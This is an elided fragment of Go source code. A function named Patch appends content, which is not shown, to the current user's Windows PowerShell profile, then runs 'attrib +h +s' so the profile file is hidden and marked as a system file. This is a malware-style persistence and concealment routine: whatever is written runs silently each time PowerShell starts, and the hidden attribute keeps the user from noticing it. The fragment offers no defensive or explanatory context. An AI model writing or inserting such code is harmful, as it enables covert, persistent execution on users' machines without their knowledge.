...
func Patch() {
	...
	profilePath := filepath.Join(userDir, "Documents", "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1")

	err = os.MkdirAll(filepath.Dir(profilePath), os.ModePerm)
	if err != nil {
		panic(err)
	}

	file, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, os.ModePerm)
	if err != nil {
		panic(err)
	}
	defer file.Close()
...
`
	...
	err = exec.Command("attrib", "+h", "+s", profilePath).Run()
	if err != nil {
		panic(err)
	}
